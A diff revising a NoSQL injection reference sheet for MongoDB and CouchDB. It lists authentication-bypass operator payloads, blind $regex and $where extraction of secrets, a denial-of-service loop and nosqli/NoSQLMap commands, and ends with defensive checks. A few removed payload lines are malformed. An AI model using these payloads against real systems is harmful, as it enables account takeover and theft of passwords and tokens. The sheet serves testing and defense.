@@ -1,156 +1,79 @@
-# NoSQL Injection: MongoDB & Document DB Complete Reference
+# NoSQL Injection: 2026 Complete Reference
 
-## Injection Types
+## MongoDB Operator Injection
 
-### 1. Operator Injection (Most Common)
-When an application passes user-controlled JSON objects directly into MongoDB queries without type validation.
+MongoDB queries use JSON objects with comparison operators. Vulnerability arises when user input reaches query object as a JSON structure (not sanitized).
 
-```javascript
-// Vulnerable Node.js pattern
-app.post('/login', async (req, res) => {
-  const user = await db.collection('users').findOne({
-    username: req.body.username,   // User sends object instead of string
-    password: req.body.password
-  });
-});
-```
+### Authentication Bypass Operators
 
-#### Authentication Bypass Payloads
+| Operator | Payload | Effect |
+|----------|---------|--------|
+| `$ne` | `{"password": {"$ne": "x"}}` | Returns first user whose password != "x" |
+| `$gt` | `{"password": {"$gt": ""}}` | Any non-empty string is > "" |
+| `$regex` | `{"password": {"$regex": ".*"}}` | Matches any value |
+| `$exists` | `{"password": {"$exists": true}}` | True if field exists |
+| `$in` | `{"password": {"$in": ["", "admin"]}}` | Matches array values |
+| `$nin` | `{"password": {"$nin": ["x"]}}` | Not in array |
+
+### Common Injection Points
 ```json
-{"username": "admin", "password": {"$ne": null}}
-{"username": {"$ne": null}, "password": {"$ne": null}}
-{"username": "admin", "password": {"$gt": ""}}
-{"username": {"$gt": ""}, "password": {"$gt": ""}}
-{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
-{"username": {"$exists": true}, "password": {"$exists": true}}
-{"username": "admin", "password": {"$in": ["", "admin", "password", "123456"]}}
+// JSON body (Express body-parser)
+{"username":"admin","password":{"$ne":""}}
+
+// URL query parameter (bracket notation)
+?username=admin&password[$ne]=
+
+// POST form parameter
+username=admin&password[$gt]=
 ```
 
-#### URL Parameter Variant (Express bracket notation)
-```
-/login?username=admin&password[$ne]=
-/login?username=admin&password[$gt]=
-/login?username[$regex]=.*&password[$regex]=.*
-/login?username[$ne]=null&password[$ne]=null
-```
+PHP automatically converts `password[$ne]=x` into `{"password": {"$ne": "x"}}`.
 
-### 2. JavaScript Injection ($where)
-MongoDB's $where operator executes JavaScript server-side. The most dangerous class.
+## Blind Data Extraction via $regex
 
-```javascript
-// Vulnerable
-const results = await db.collection('users').find({
-  $where: req.body.filter    // Arbitrary JS execution
-}).toArray();
-```
-
-#### Detection
+Extract data character by character using boolean signal (200 vs 403, different response length):
 ```json
-{"$where": "1"}
+{"username": "admin", "password": {"$regex": "^a"}}
+{"username": "admin", "password": {"$regex": "^b"}}
+```
+
+Extend one character at a time: `^a` → `^ad` → `^adm` → `^admi` → `^admin`
+
+Works against any string field: passwords, API keys, reset tokens. Automate with `nosqli` CLI.
+
+## Time-Based Detection via $where
+
+`$where` evaluates JavaScript expressions server-side (enabled by default in MongoDB):
+```json
 {"$where": "sleep(5000)"}
-{"$where": "this.password.length > 0"}
+{"$where": "function() { sleep(5000); return true; }"}
 ```
 
-#### Data Extraction
+Conditional sleep for data extraction:
 ```json
-{"username": "admin", "password": {"$where": "this.password[0]=='a'?sleep(2000):0"}}
-{"$where": "this.username.match(/^a/)?sleep(2000):0"}
-{"$where": "this.role=='admin'?sleep(2000):0"}
+{"$where": "this.password.match(/^a/) && sleep(5000)"}
 ```
 
-#### Full JavaScript RCE (older MongoDB)
-```json
-{"$where": "while(true){}"}]  // DoS
-{"$where": "1;print('hello');"}
-```
+### MongoDB Version Specifics
+- v4.4+: Dropped BSON type 15 (JavaScript with scope) — but string `$where` still works
+- MUST disable via `security.javascriptEnabled: false` in config
+- Check version from error messages or info disclosure endpoints
 
-### 3. Syntax Injection (JSON Filter)
-When the application uses string concatenation to build JSON queries.
+## CouchDB Injection
 
-```javascript
-// Vulnerable pattern
-const query = '{"username":"' + req.body.username + '","password":"' + req.body.password + '"}';
-const user = await db.collection('users').findOne(JSON.parse(query));
-```
+### Pre-3.0 Party Mode
+- Port 5984 accessible without auth
+- `_users` database stores hashed passwords for all registered users
+- Full read access to `_all_dbs` means entire data layer exposed
+- 3.0+ enforces admin setup, but containers pulling 2.x images still expose this
 
-#### Payload
-```
-Input username: ", "password": {"$ne": null}}//
-Result: {"username":"", "password": {"$ne": null}}//","password":""}
-```
+## Tools
+- **nosqli** (Go, actively maintained): Detection, boolean blind, timing attacks. Accepts Burp request files.
+- **NoSQLMap** (Python, older): Menu-driven, MongoDB + CouchDB, dictionary attacks. Less maintained but covers more scenarios.
 
-### 4. Aggregation Pipeline Injection
-```javascript
-// Vulnerable
-const pipeline = [
-  { $match: { $where: req.body.filter } },
-  { $group: { _id: "$" + req.body.field } }
-];
-```
-
-## Blind Data Extraction
-
-### $regex Character-by-Character
-```
-# API returns different response for match vs no match
-{"username": "admin", "password": {"$regex": "^a"}}  // match
-{"username": "admin", "password": {"$regex": "^b"}}  // no match
-
-# Iterate through character positions
-{"username": "admin", "password": {"$regex": "^ad"}}
-{"username": "admin", "password": {"$regex": "^adm"}}
-{"username": "admin", "password": {"$regex": "^admi"}}
-```
-
-### $where Time-Based
-```
-{"$where": "this.password[0]==97?sleep(5000):1"}
-# ASCII 97 = 'a'. 5 second delay confirms password starts with 'a'
-```
-
-## Content-Type Switching
-
-```bash
-# Some apps accept both JSON and URL-encoded
-# Send URL-encoded variant when JSON is blocked
-username=admin&password[$ne]=
-
-# Express query parser converts brackets to objects:
-# password[$ne]=  ->  {"password": {"$ne": ""}}
-```
-
-## Tooling
-
-### nosqli
-```bash
-# Automated NoSQL injection detection + exploitation
-nosqli -t http://target.com/api/login -d '{"username":"admin","password":{"$ne":""}}'
-nosqli -t http://target.com/api/users -i request.txt --technique=operator,where,regex
-```
-
-### NoSQLMap
-```bash
-python3 nosqlmap.py --target http://target.com/login --method POST --data 'user=admin&password=test'
-```
-
-## Defense Pattern Reference
-```javascript
-// Safe: type validation
-if (typeof req.body.username !== 'string' || typeof req.body.password !== 'string') {
-  return res.status(400).json({ error: 'Invalid input' });
-}
-
-// Safe: Mongoose strict schema
-const UserSchema = new mongoose.Schema({
-  username: { type: String, required: true },
-  password: { type: String, required: true }
-}, { strict: true });
-
-// Safe: express-mongo-sanitize middleware
-app.use(mongoSanitize({
-  replaceWith: '_',
-  onSanitize: ({ req, key }) => {
-    console.warn('Sanitized key:', key);
-  }
-}));
-```
+## Defensive Checklist
+1. Always validate input types — reject objects where strings expected
+2. Use strict schema validation (Mongoose `strict: true`)
+3. Disable `$where` entirely (`security.javascriptEnabled: false`)
+4. Sanitize query parameters — reject `$` prefixed keys
+5. Use parameterized queries or MongoDB's Object mapping layer properly
